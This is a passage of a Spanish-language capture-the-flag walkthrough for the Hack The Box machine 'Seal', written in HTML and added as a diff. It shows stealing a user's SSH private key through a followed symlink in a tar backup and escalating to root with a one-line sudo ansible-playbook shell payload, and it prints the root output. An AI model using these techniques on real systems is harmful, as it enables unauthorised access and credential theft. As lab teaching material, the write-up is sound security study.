+                <pre><code class="language-bash"><span style="color:#61afef;">tar</span> <span style="color:#d19a66;">-xf</span> backup-2026-03-01-19:51:32 <span style="color:#d19a66;">--force-local</span></code></pre>
+
+                <p>Navegando al directorio <code>uploads/</code> extraído se comprueba que el symlink fue seguido y el
+                    fichero <code>xd</code> contiene la clave privada SSH de <code>luis</code>. Copio el contenido,
+                    lo guardo como <code>id_rsa</code> en mi máquina local, establezco los permisos correctos y me
+                    conecto:</p>
+                <pre><code class="language-bash"><span style="color:#61afef;">chmod</span> 600 id_rsa
+<span style="color:#61afef;">ssh</span> <span style="color:#d19a66;">-i</span> id_rsa luis@seal.htb</code></pre>
+
+                <p>Ahora tengo sesión como <code>luis</code> y puedo leer la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios — sudo ansible-playbook</h2>
+                <p>Compruebo los permisos de sudo como <code>luis</code>:</p>
+                <pre><code class="language-bash"><span style="color:#61afef;">sudo</span> <span style="color:#d19a66;">-l</span></code></pre>
+                <pre><code class="language-plaintext">Matching Defaults entries for luis on seal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User luis may run the following commands on seal:
+    (ALL) NOPASSWD: /usr/bin/ansible-playbook *</code></pre>
+
+                <p><code>luis</code> puede ejecutar <code>ansible-playbook</code> con cualquier argumento como root,
+                    sin contraseña. Es un vector de escalada de privilegios bien conocido documentado en GTFOBins:
+                    <a href="https://gtfobins.github.io/gtfobins/ansible-playbook/#shell">https://gtfobins.github.io/gtfobins/ansible-playbook/#shell</a>
+                </p>
+
+                <p>La técnica es sencilla: escribir un playbook personalizado que use el módulo <code>shell</code> de
+                    Ansible para lanzar una shell interactiva conectada al terminal actual:</p>
+                <pre><code class="language-bash"><span style="color:#61afef;">echo</span> <span style="color:#98c379;">'[{hosts: localhost, tasks: [shell: /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]}]'</span> &gt; /tmp/xd.yml
+<span style="color:#61afef;">sudo</span> ansible-playbook /tmp/xd.yml</code></pre>
+
+                <pre><code class="language-plaintext">[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'
+
+PLAY [localhost] ***************************************************************************
+
+TASK [Gathering Facts] *********************************************************************
+ok: [localhost]
+
+TASK [shell] *******************************************************************************
+# whoami
+root</code></pre>
+
+                <p>El playbook ejecuta la shell como root, obteniendo acceso total al sistema y la flag de root.</p>
+            </div>
+
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
